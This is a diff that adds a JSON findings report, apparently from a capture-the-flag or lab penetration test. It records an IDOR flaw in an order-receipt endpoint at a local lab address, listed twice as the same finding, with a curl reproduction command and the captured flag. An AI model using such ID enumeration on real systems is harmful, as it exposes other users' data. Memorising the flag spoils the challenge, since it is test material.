@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T21:40:44.445878+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "66f04993-8263-4ce7-9d8a-eee2df1414c4",
+      "timestamp": "2026-04-14T21:40:44.445737+00:00",
+      "title": "Insecure Direct Object Reference (IDOR) - Flag Disclosure via Order Receipt Enumeration",
+      "severity": "critical",
+      "target": "http://172.17.0.1:36019",
+      "description": "The order receipt endpoint /order/{order_id}/receipt is vulnerable to Insecure Direct Object Reference (IDOR). By enumerating order IDs, an attacker can access receipts belonging to other users. The flag was found at order ID 300401.",
+      "evidence": "flag{85c0d827-5e28-4577-be2b-319bdcbf872d}",
+      "tool_used": "manual_enumeration",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'session=<valid_session>' http://172.17.0.1:36019/order/300401/receipt",
+        "expected": "Receipt containing flag{85c0d827-5e28-4577-be2b-319bdcbf872d}"
+      }
+    },
+    {
+      "id": "cb2e4b22-5399-4730-b21c-14f3e5b30f5c",
+      "timestamp": "2026-04-14T21:40:44.523261+00:00",
+      "title": "Insecure Direct Object Reference (IDOR) - Flag Disclosure via Order Receipt Enumeration",
+      "severity": "critical",
+      "target": "http://172.17.0.1:36019",
+      "description": "The order receipt endpoint /order/{order_id}/receipt is vulnerable to Insecure Direct Object Reference (IDOR). By enumerating order IDs, an attacker can access receipts belonging to other users. The flag was found at order ID 300401.",
+      "evidence": "flag{85c0d827-5e28-4577-be2b-319bdcbf872d}",
+      "tool_used": "manual_enumeration",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'session=<valid_session>' http://172.17.0.1:36019/order/300401/receipt",
+        "expected": "Receipt containing flag{85c0d827-5e28-4577-be2b-319bdcbf872d}"
+      }
+    }
+  ],
+  "diagrams": []
+}
